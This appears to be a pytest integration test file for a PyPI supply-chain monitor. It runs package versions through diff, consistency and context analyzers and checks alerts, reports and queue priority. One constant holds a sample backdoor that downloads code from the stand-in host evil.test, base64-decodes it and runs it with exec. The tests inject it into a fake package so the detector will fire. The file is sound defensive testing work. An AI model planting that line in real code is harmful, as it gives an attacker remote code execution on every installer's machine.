"""A pair of versions through the whole pipeline, against a real PostgreSQL."""

import hashlib
import io
import json
import tarfile
from collections.abc import AsyncIterator
from dataclasses import dataclass, field
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

import httpx
import pytest
from sqlalchemy import select, update

from pypi_monitor.analyzers.consistency import ConsistencyAnalyzer
from pypi_monitor.analyzers.context import ContextAnalyzer
from pypi_monitor.analyzers.diff import DiffAnalyzer
from pypi_monitor.db.models import Artifact, Package, Release
from pypi_monitor.db.models import Signal as SignalRow
from pypi_monitor.db.session import Sessions
from pypi_monitor.domain import ReleaseStatus, Severity
from pypi_monitor.github import GitHubArchives
from pypi_monitor.ingest.store import record_release
from pypi_monitor.pipeline.queue import Stage
from pypi_monitor.pipeline.stages import Pipeline
from pypi_monitor.pipeline.unpack import UnpackLimits
from pypi_monitor.pypi import PyPIClient
from pypi_monitor.pypi.client import FILES_HOST
from pypi_monitor.report import release_report
from pypi_monitor.scoring import load_scoring_config
from tests.conftest import FakeQueue, FakeStorage
from tests.test_pipeline import RecordingNotifier, sdist

LIMITS = UnpackLimits(max_bytes=10_000_000, max_files=1000, max_ratio=1000)
CLEAN = {"setup.py": "from setuptools import setup\nsetup()\n", "lib/__init__.py": "X = 1\n"}
BACKDOOR = (
    "import base64, urllib.request\n"
    'exec(base64.b64decode(urllib.request.urlopen("https://evil.test/p").read()))\n'
)
INFECTED = {**CLEAN, "lib/__init__.py": BACKDOOR + "X = 1\n"}
START = datetime(2026, 1, 1, tzinfo=UTC)


@dataclass
class Index:
    """Serves a project with several versions the way pypi.org does."""

    name: str
    uploads: dict[str, datetime] = field(default_factory=dict)
    archives: dict[str, bytes] = field(default_factory=dict)
    owners: list[str] = field(default_factory=lambda: ["alice"])
    repository: str | None = None
    downloads: list[str] = field(default_factory=list)

    def publish(self, version: str, files: dict[str, str], upload: datetime = START) -> None:
        self.archives[version] = sdist(f"{self.name}-{version}", files)
        self.uploads[version] = upload

    def _file(self, version: str) -> dict[str, Any]:
        archive = self.archives[version]
        filename = f"{self.name}-{version}.tar.gz"
        return {
            "filename": filename,
            "packagetype": "sdist",
            "size": len(archive),
            "url": f"https://{FILES_HOST}/{filename}",
            "digests": {"sha256": hashlib.sha256(archive).hexdigest()},
            "upload_time_iso_8601": self.uploads[version].isoformat(),
        }

    def _simple(self) -> dict[str, Any]:
        files = [self._file(version) for version in self.archives]
        return {
            "versions": list(self.archives),
            "files": [
                {
                    "filename": file["filename"],
                    "size": file["size"],
                    "url": file["url"],
                    "hashes": file["digests"],
                    "upload-time": file["upload_time_iso_8601"],
                    "yanked": False,
                }
                for file in files
            ],
        }

    def handle(self, request: httpx.Request) -> httpx.Response:
        path = request.url.path
        if request.url.host == FILES_HOST:
            self.downloads.append(path)
            version = path.removeprefix(f"/{self.name}-").removesuffix(".tar.gz")
            return httpx.Response(200, content=self.archives[version])
        if path == f"/simple/{self.name}/":
            assert "pypi.simple" in request.headers["accept"]
            return httpx.Response(200, json=self._simple())
        info: dict[str, Any] = {"name": self.name, "description": "x" * 200}
        if self.repository:
            info["project_urls"] = {"Source": f"https://github.com/{self.repository}"}
        data: dict[str, Any] = {
            "info": info,
            "ownership": {"roles": [{"role": "Owner", "user": u} for u in self.owners]},
            "last_serial": 1,
        }
        if path == f"/pypi/{self.name}/json":
            data["releases"] = {v: [self._file(v)] for v in self.archives}
        else:
            data["urls"] = [self._file(path.split("/")[3])]
        return httpx.Response(200, content=json.dumps(data))


@dataclass
class World:
    index: Index
    pipeline: Pipeline
    sessions: Sessions
    queue: FakeQueue
    notifier: RecordingNotifier

    async def process(self, version: str) -> int:
        async with self.sessions.begin() as session:
            release_id = await record_release(session, self.index.name, version)
        assert release_id is not None
        self.queue.jobs.append((Stage.DOWNLOAD, release_id))
        while self.queue.jobs:
            stage, job = self.queue.jobs.pop(0)
            await getattr(self.pipeline, stage.value)(job)
        return release_id

    async def release(self, version: str) -> Release:
        async with self.sessions() as session:
            release = await session.scalar(select(Release).where(Release.version == version))
        assert release is not None
        return release

    async def rules(self) -> set[str]:
        async with self.sessions() as session:
            return set(await session.scalars(select(SignalRow.rule_id)))


@pytest.fixture
async def world(sessions: Sessions, queue: FakeQueue, storage: FakeStorage) -> AsyncIterator[World]:
    index = Index("lib")
    client = PyPIClient(httpx.MockTransport(index.handle))
    notifier = RecordingNotifier()
    pipeline = Pipeline(
        sessions=sessions,
        client=client,
        storage=storage,  # type: ignore[arg-type]
        queue=queue,
        notifier=notifier,
        scoring=load_scoring_config(Path("config/scoring.yaml")),
        analyzers=[DiffAnalyzer(), ConsistencyAnalyzer(), ContextAnalyzer()],
        limits=LIMITS,
        max_artifact_bytes=5_000_000,
        analyzer_timeout_s=60,
    )
    yield World(index, pipeline, sessions, queue, notifier)
    await client.aclose()


async def test_injected_backdoor_leads_to_an_alert(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", INFECTED, START + timedelta(days=1))

    release_id = await world.process("1.1")

    release = await world.release("1.1")
    baseline = await world.release("1.0")
    assert release.id == release_id
    assert release.prev_release_id == baseline.id
    assert release.status is ReleaseStatus.ALERTED
    assert release.pypi_metadata["previous_version"] == "1.0"
    assert baseline.status is ReleaseStatus.BASELINE
    assert world.notifier.alerts[0].level is Severity.CRITICAL
    assert world.notifier.alerts[0].signals[0].rule_id == "diff.exec_decoded"


async def test_ordinary_update_is_clean(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", {**CLEAN, "lib/new.py": "Y = 2\n"}, START + timedelta(days=1))

    await world.process("1.1")

    assert (await world.release("1.1")).status is ReleaseStatus.CLEAN
    assert world.notifier.alerts == []


async def test_first_version_has_no_baseline(world: World) -> None:
    world.index.publish("1.0", CLEAN)

    await world.process("1.0")

    assert (await world.release("1.0")).prev_release_id is None
    assert not {rule for rule in await world.rules() if rule.startswith("diff.")}


async def test_processed_previous_release_is_reused(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    await world.process("1.0")
    world.index.publish("1.1", {**CLEAN, "lib/new.py": "Y = 2\n"}, START + timedelta(days=1))
    world.index.downloads.clear()

    await world.process("1.1")

    first = await world.release("1.0")
    assert first.status is ReleaseStatus.CLEAN
    assert (await world.release("1.1")).prev_release_id == first.id
    assert world.index.downloads == ["/lib-1.1.tar.gz"]


async def test_baseline_artifacts_are_stored_once(world: World, storage: FakeStorage) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    world.index.publish("1.2", CLEAN, START + timedelta(days=2))

    await world.process("1.1")
    await world.process("1.2")

    assert "lib/1.0/lib-1.0.tar.gz" in storage.objects
    assert world.index.downloads.count("/lib-1.0.tar.gz") == 1
    async with world.sessions() as session:
        assert len(list(await session.scalars(select(Artifact)))) == 3


async def test_baseline_never_goes_through_the_stages(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    await world.process("1.1")
    baseline = await world.release("1.0")
    old = datetime.now(UTC) - timedelta(hours=1)
    async with world.sessions.begin() as session:
        await session.execute(update(Release).values(created_at=old))

    assert await world.pipeline.sweep(stale_after_s=60) == 0

    await world.pipeline.download(baseline.id)
    assert (await world.release("1.0")).status is ReleaseStatus.BASELINE


async def test_a_baseline_seen_in_the_stream_gets_analyzed(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    await world.process("1.1")

    await world.process("1.0")

    assert (await world.release("1.0")).status is ReleaseStatus.CLEAN


async def test_known_release_is_not_recorded_twice(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    await world.process("1.0")

    async with world.sessions.begin() as session:
        assert await record_release(session, "lib", "1.0") is None


async def test_owner_change_is_seen_only_against_our_own_snapshot(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", CLEAN, START + timedelta(days=1))
    world.index.owners = ["mallory"]

    # 1.0 is a baseline here: PyPI would show today's owners for it, so nothing is known.
    await world.process("1.1")
    assert not {rule for rule in await world.rules() if rule.startswith("context.owner")}

    world.index.owners = ["eve"]
    world.index.publish("1.2", CLEAN, START + timedelta(days=2))
    await world.process("1.2")
    assert "context.owners_replaced" in await world.rules()


async def test_dormant_project_with_a_jump(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("7.0", CLEAN, START + timedelta(days=800))

    await world.process("7.0")

    assert {"context.dormant_release", "context.version_jump"} <= await world.rules()


async def test_report_shows_the_analysis(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    world.index.publish("7.0", INFECTED, START + timedelta(days=800))
    await world.process("7.0")

    report = await release_report(world.sessions, "lib", "7.0")

    assert "lib 7.0: alerted" in report
    assert "compared with: 1.0" in report
    assert "owners: alice" in report
    assert "verdict: critical" in report
    assert "context.dormant_release" in report
    assert "diff.exec_decoded lib-7.0.tar.gz/lib-7.0/lib/__init__.py:2" in report
    assert await release_report(world.sessions, "lib", "9") == "lib 9 is not known"


async def make_popular(world: World) -> None:
    async with world.sessions.begin() as session:
        await session.execute(update(Package).values(is_popular=True))


async def test_popular_package_stays_in_the_priority_queue(world: World) -> None:
    world.index.publish("1.0", INFECTED)
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.0")
    assert release_id is not None
    await make_popular(world)

    await world.pipeline.download(release_id)
    await world.pipeline.analyze(release_id)
    await world.pipeline.score(release_id)

    assert world.queue.priority >= {(Stage.ANALYZE, release_id), (Stage.SCORE, release_id)}


async def test_ordinary_package_stays_in_the_usual_queue(world: World) -> None:
    world.index.publish("1.0", CLEAN)
    await world.process("1.0")

    assert world.queue.priority == set()


async def test_sweep_keeps_the_priority(world: World) -> None:
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.0")
    await make_popular(world)

    await world.pipeline.sweep(stale_after_s=-60)

    assert (Stage.DOWNLOAD, release_id) in world.queue.priority


def tag_archive(files: dict[str, str]) -> bytes:
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as tar:
        for path, content in files.items():
            data = content.encode()
            member = tarfile.TarInfo(f"repo-1.1/{path}")
            member.size = len(data)
            tar.addfile(member, io.BytesIO(data))
    return buffer.getvalue()


async def test_popular_package_is_compared_with_its_tag(world: World) -> None:
    world.index.repository = "org/repo"
    world.index.publish("1.0", CLEAN)
    world.index.publish("1.1", INFECTED, START + timedelta(days=1))
    asked: list[str] = []

    def handle(request: httpx.Request) -> httpx.Response:
        asked.append(request.url.path)
        return httpx.Response(200, content=tag_archive(CLEAN))

    github = GitHubArchives(httpx.MockTransport(handle))
    world.pipeline._github = github
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.1")
    await make_popular(world)
    world.queue.jobs.append((Stage.DOWNLOAD, release_id))  # type: ignore[arg-type]
    while world.queue.jobs:
        stage, job = world.queue.jobs.pop(0)
        await getattr(world.pipeline, stage.value)(job)
    await github.aclose()

    assert asked == ["/org/repo/tar.gz/refs/tags/v1.1"]
    assert "consistency.tag_code_differs" in await world.rules()


async def test_ordinary_package_is_not_compared_with_its_tag(world: World) -> None:
    world.index.repository = "org/repo"
    world.index.publish("1.0", CLEAN)
    asked: list[str] = []

    def handle(request: httpx.Request) -> httpx.Response:
        asked.append(request.url.path)
        return httpx.Response(404)

    github = GitHubArchives(httpx.MockTransport(handle))
    world.pipeline._github = github

    await world.process("1.0")
    await github.aclose()

    assert asked == []


async def test_github_failure_does_not_stop_the_release(world: World) -> None:
    world.index.repository = "org/repo"
    world.index.publish("1.0", CLEAN)
    github = GitHubArchives(httpx.MockTransport(lambda _: httpx.Response(503)))
    world.pipeline._github = github
    async with world.sessions.begin() as session:
        release_id = await record_release(session, "lib", "1.0")
    await make_popular(world)
    world.queue.jobs.append((Stage.DOWNLOAD, release_id))  # type: ignore[arg-type]
    while world.queue.jobs:
        stage, job = world.queue.jobs.pop(0)
        await getattr(world.pipeline, stage.value)(job)
    await github.aclose()

    assert (await world.release("1.0")).status is ReleaseStatus.CLEAN
